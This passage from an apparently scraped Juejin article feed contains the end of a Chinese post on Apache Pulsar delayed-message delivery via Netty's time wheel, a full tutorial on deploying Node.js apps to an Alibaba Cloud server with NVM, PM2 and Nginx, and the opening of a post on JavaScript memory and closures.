        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-type">long</span> <span class="hljs-variable">remainingTickDelayMillis</span> <span class="hljs-operator">=</span> lastTickRun + tickTimeMillis - now;

    <span class="hljs-comment">// 应该设置的 delay = max(消息实际 delay, tick 间隔 delay)</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">calculatedDelayMillis</span> <span class="hljs-operator">=</span> Math.max(delayMillis, remainingTickDelayMillis);

    <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
        log.debug(<span class="hljs-string">"[{}] Start timer in {} millis"</span>,
                  dispatcher.getName(), calculatedDelayMillis);
    }

    currentTimeoutTarget = timestamp;

    <span class="hljs-comment">// 注册新的 timeout（即定时任务）到时间轮中</span>
    <span class="hljs-comment">// 到 calculatedDelayMillis 毫秒后，时间轮会回调 this.run() 或 checkAndTrigger()</span>
    timeout = timer.newTimeout(<span class="hljs-built_in">this</span>, calculatedDelayMillis, TimeUnit.MILLISECONDS);
}
</code></pre>
<p>当我们定位到timer时，我们会发现，其实就是用的netty的timer</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d44824214cd44cbd9751d8b9a3cf36dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2luY2VyZWx5cGx6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943003&amp;x-signature=HryH8r8CGZ4dXE93QNVSqbXfMNQ%3D" alt="QQ_1765335755320.png" loading="lazy"/></p>
<p>netty的时间轮在很多java相关的框架都有使用，比如redisson在实现看门狗的时候也是用的<em>Netty</em>的<em>HashedWheelTimer</em>， 还有dubbo。</p>
<p>时间轮每个broker是只有一个，这个我们可以看到timer在TrackerFactory中，即所有的Tracker队列 共享一个时间轮。</p>
<h2 data-id="heading-2">时间轮</h2>
<p>到底什么是时间轮呢？
我看了有一篇文章写的很好，非常通俗易懂，建议收藏。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F609284043" target="_blank" title="https://zhuanlan.zhihu.com/p/609284043" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/609284043</a></p>
<h2 data-id="heading-3">完整处理流程</h2>
<p>按照上述源码流程，我画了一个图来描述pulsar定时消息的图。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/643c0683dbc14d978bea96f89b30cb8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2luY2VyZWx5cGx6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943003&amp;x-signature=nYZAE9FU7zIHw%2BdhoV5BNNoLrcA%3D" alt="image.png" loading="lazy"/></p>
<p>整个流程描述如下：</p>
<ol>
<li>Producer 发送消息时，会在消息的 metadata 中写入 deliverAt 时间（延迟投递时间）。<br/>
消息到达 Broker 后，Broker 会像普通消息一样立即将其持久化到 BookKeeper。</li>
<li>每个 Subscription 拥有自己的 Cursor。Cursor 会按顺序从 BookKeeper 读取该 Topic 的消息，并将读取到的消息交给 Dispatcher 处理。</li>
<li>Dispatcher 在处理消息时会解析 metadata：如果 deliverAt 大于当前时间，说明消息尚未到期。此时 Dispatcher 不会将消息投递给消费者，而是将其加入该订阅对应的延迟队列（DelayedDeliveryTracker）。</li>
<li>DelayedDeliveryTracker 会向 Broker 的全局时间轮（HashedWheelTimer）注册一个定时检查任务。Tracker 本身负责管理所有延迟消息的时间索引。</li>
<li>时间轮在每一次 tick 时会回调 Tracker，让 Tracker 自行判断哪些延迟消息已经到达投递时间。</li>
<li>一旦某条消息到期，Tracker 会将其调度回 Dispatcher，由 Dispatcher 再次从 BookKeeper 读取该消息，并按照订阅策略正常投递给消费者。</li>
</ol>
<h2 data-id="heading-4">参考</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F609284043" target="_blank" title="https://zhuanlan.zhihu.com/p/609284043" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/609284043</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fpulsar%2Ftree%2Fmaster%2Fpulsar-broker%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fpulsar%2Fbroker" target="_blank" title="https://github.com/apache/pulsar/tree/master/pulsar-broker/src/main/java/org/apache/pulsar/broker" ref="nofollow noopener noreferrer">github.com/apache/puls…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node项目部署到阿里云服务器]]></title>    <link>https://juejin.cn/post/7581761825482768420</link>    <guid>https://juejin.cn/post/7581761825482768420</guid>    <pubDate>2025-12-10T03:19:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581761825482768420" data-draft-id="7524712962072231951" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node项目部署到阿里云服务器"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2025-12-10T03:19:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南游"/> <meta itemprop="url" content="https://juejin.cn/user/1728872003943688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node项目部署到阿里云服务器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1728872003943688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南游
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:19:52.000Z" title="Wed Dec 10 2025 03:19:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、服务器基础准备</h2>
<h3 data-id="heading-1">1.  服务器配置</h3>
<ul>
<li>购买云服务器（阿里云）</li>
<li>选择适合的操作系统（CentOS 7.9）</li>
<li>开放安全组端口：<code>22</code>(SSH)、<code>80</code>(HTTP)、<code>443</code>(HTTPS)、<code>你的应用端口</code>（如3000）</li>
</ul>
<h3 data-id="heading-2">2.  本地项目准备</h3>
<ul>
<li>确保项目在本地运行正常</li>
<li>清理 <code>node_modules</code> 和测试文件</li>
</ul>
<h2 data-id="heading-3">二、环境安装与配置</h2>
<h3 data-id="heading-4">1.  安装Node.js</h3>
<p>在Linux上部署Node.js，本文选择使用NVM（Node Version Manager）。与包管理器安装相比，NVM不受系统仓库版本限制，确保获取最新Node.js版本；与下载预编译二进制包相比，NVM省去了繁琐的环境变量配置；与从源代码编译安装相比，NVM大大缩短了安装时间，且对用户编译技能无要求。更重要的是，NVM支持多版本管理，方便切换，且安装的Node.js位于用户家目录，无需sudo权限，有效降低了安全风险。</p>
<ol>
<li>
<p><strong>安装分布式版本管理系统Git。</strong></p>
<p>Alibaba Cloud Linux 3/2、CentOS 7.x</p>
<pre><code class="hljs language-bash" lang="bash">sudo yum install git -y
</code></pre>
</li>
<li>
<p><strong>使用Git将NVM的源码克隆到本地的~/.nvm目录下，并检查最新版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://gitee.com/mirrors/nvm.git ~/.nvm &amp;&amp; <span class="hljs-built_in">cd</span> ~/.nvm &amp;&amp; git checkout `git describe --abbrev=0 --tags`
</code></pre>
</li>
<li>
<p><strong>依次运行以下命令，配置NVM的环境变量。</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo sh -c <span class="hljs-string">'echo ". ~/.nvm/nvm.sh" &gt;&gt; /etc/profile'</span>
<span class="hljs-built_in">source</span> /etc/profile
</code></pre>
</li>
<li>
<p><strong>运行以下命令，修改npm镜像源为阿里云镜像，以加快Node.js下载速度。</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node
</code></pre>
</li>
<li>
<p><strong>运行以下命令，查看Node.js版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">nvm list-remote
</code></pre>
</li>
<li>
<p><strong>安装多个Node.js版本。</strong></p>
<p>Alibaba Cloud Linux 2 和 CentOS 7.x 仅支持 Node.js 17.x 及以下版本，例如需要安装 v17.9.1，则执行nvm install v17.9.1。</p>
<pre><code class="hljs language-bash" lang="bash">nvm install v17.9.1
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1927db7a59e446a299f2a80b6cf17e14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=nZ5MeyNSCM2JxLxY7%2FOwyd1CKUM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8db54b6e9da4281ae6c18ec18e39603~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=xD5JmgSq8ptL7At64sRqJVa8M74%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>查看已安装的Node.js版本。</strong></p>
<pre><code class="hljs language-bash" lang="bash">nvm <span class="hljs-built_in">ls</span>
</code></pre>
<p>返回结果如下所示，表示当前已安装v22.11.0、v23.3.0两个版本，正在使用的是v22.11.0版本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aacdb173fbed4c8e91f05968f5ae559e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=RyWJBJdxFeiJaa6LgKO2eSR27tA%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>切换版本</strong></p>
<p>您可以使用nvm use &lt;版本号&gt;命令切换Node.js的版本。
例如，切换至Node.js v23.3.0版本的命令为nvm use v23.3.0。</p>
</li>
</ol>
<h3 data-id="heading-5">2.  安装PM2（进程管理）</h3>
<pre><code class="hljs language-bash" lang="bash">sudo npm install -g pm2
</code></pre>
<h3 data-id="heading-6">3.  安装Nginx（反向代理）</h3>
<pre><code class="hljs language-bash" lang="bash">sudo yum install -y nginx

<span class="hljs-comment"># 启动Nginx</span>
sudo systemctl start nginx
sudo systemctl <span class="hljs-built_in">enable</span> nginx <span class="hljs-comment">#开机自动启动</span>
</code></pre>
<h2 data-id="heading-7">三、部署Node.js项目</h2>
<p>假设有两个项目：</p>
<ul>
<li>项目1：端口3000，子域名api1.example.com</li>
<li>项目2：端口4000，子域名api2.example.com</li>
</ul>
<h3 data-id="heading-8">1.  上传项目代码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目目录</span>
<span class="hljs-built_in">mkdir</span> -p /var/www/api1 /var/www/api2

<span class="hljs-comment"># 上传代码（使用git）</span>

<span class="hljs-built_in">cd</span> /var/www/api1
git <span class="hljs-built_in">clone</span> your-repo-url
npm install

<span class="hljs-built_in">cd</span> /var/www/api2
git <span class="hljs-built_in">clone</span> your-second-repo-url
npm install
</code></pre>
<h3 data-id="heading-9">2.  使用PM2启动项目</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动项目1</span>
<span class="hljs-built_in">cd</span> /var/www/api1
pm2 start app.js --name <span class="hljs-string">"api1"</span> -i max --watch

<span class="hljs-comment"># 启动项目2</span>
<span class="hljs-built_in">cd</span> /var/www/api2
pm2 start app.js --name <span class="hljs-string">"api2"</span> -i max --watch

<span class="hljs-comment"># 保存PM2配置</span>
pm2 save

<span class="hljs-comment"># 设置PM2开机启动</span>
pm2 startup
<span class="hljs-comment"># 执行输出的命令（会显示类似下面的命令）</span>
<span class="hljs-comment"># sudo env PATH=$PATH:/usr/bin /usr/lib/node_modules/pm2/bin/pm2 startup centos -u root --hp /root</span>
</code></pre>
<h2 data-id="heading-10">四、配置子域名和Nginx反向代理</h2>
<h3 data-id="heading-11">1. 域名解析准备</h3>
<p>在阿里云DNS解析控制台添加子域名解析：</p>
<ul>
<li>api1.example.com → 服务器IP</li>
<li>api2.example.com → 服务器IP</li>
</ul>
<h3 data-id="heading-12">2. 配置Nginx反向代理</h3>
<p><strong>为项目1创建配置 (api1.example.com)</strong></p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name api1.example.com;

    location / {
        proxy_pass http://localhost:3000;  # 假设项目1运行在3000端口
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
</code></pre>
<p><strong>为项目2创建配置 (api2.example.com)</strong></p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name api2.example.com;

    location / {
        proxy_pass http://localhost:4000;  # 假设项目2运行在4000端口
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
</code></pre>
<h3 data-id="heading-13">3. 测试并重启Nginx</h3>
<pre><code class="hljs language-bash" lang="bash">nginx -t
systemctl restart nginx
</code></pre>
<h2 data-id="heading-14">五、维护与监控</h2>
<h3 data-id="heading-15">1. PM2常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">pm2 list          <span class="hljs-comment"># 查看所有应用</span>
pm2 restart api1  <span class="hljs-comment"># 重启特定应用</span>
pm2 stop api2     <span class="hljs-comment"># 停止应用</span>
pm2 delete api1   <span class="hljs-comment"># 删除应用</span>
</code></pre>
<h3 data-id="heading-16">2. Nginx常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">systemctl restart nginx  <span class="hljs-comment"># 重启Nginx</span>
nginx -t                <span class="hljs-comment"># 测试配置</span>
journalctl -u nginx     <span class="hljs-comment"># 查看Nginx系统日志</span>
</code></pre>
<h3 data-id="heading-17">3. 查看服务器资源</h3>
<pre><code class="hljs language-bash" lang="bash">top
htop
<span class="hljs-built_in">df</span> -h
free -m
</code></pre>
<p>通过以上步骤，你可以在CentOS 7.9服务器上部署多个Node.js项目，并通过不同的子域名访问它们。每个项目都运行在独立的端口上，通过Nginx反向代理和PM2进程管理实现稳定运行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 内存机制与闭包：从栈到堆的深入浅出]]></title>    <link>https://juejin.cn/post/7581870491763064884</link>    <guid>https://juejin.cn/post/7581870491763064884</guid>    <pubDate>2025-12-10T03:35:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491763064884" data-draft-id="7581870491762917428" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 内存机制与闭包：从栈到堆的深入浅出"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T03:35:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 内存机制与闭包：从栈到堆的深入浅出
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:35:39.000Z" title="Wed Dec 10 2025 03:35:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端开发中，JavaScript 是我们最常用的编程语言之一。然而，很多人在学习 JS 的过程中，常常忽略了它背后运行的底层机制——<strong>内存管理</strong>。今天我们就结合几段代码和图示，来聊聊 JavaScript 中最重要的两个概念：<strong>内存机制</strong> 和 <strong>闭包</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、JS 的执行环境：三大内存空间</h2>
<p>在 JavaScript 执行过程中，程序会使用三种主要的内存空间：</p>
<ol>
<li><strong>代码空间</strong></li>
<li><strong>栈内存（Stack）</strong></li>
<li><strong>堆内存（Heap）</strong></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4aa8ff5bca0436ba3f9f8e83b989b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=c8Eq03NGEktFcYBIfbXqJUqgcI8%3D" alt="lQLPJxDjlfllrWfNBJ_NBHawALUXmftxe5cJEmLLH90MAA_1142_1183.png" loading="lazy"/></p>
<blockquote>
<p>图1：JavaScript 的三大内存空间</p>
</blockquote>
<h3 data-id="heading-1">1. 代码空间</h3>
<p>这是存放源代码的地方。当浏览器加载 HTML 文件时，会把 <code>&lt;script&gt;</code> 标签中的代码从硬盘读取到内存中，形成“代码空间”。这部分内容不会直接参与运行，而是供引擎解析和编译用。</p>
<h3 data-id="heading-2">2. 栈内存</h3>
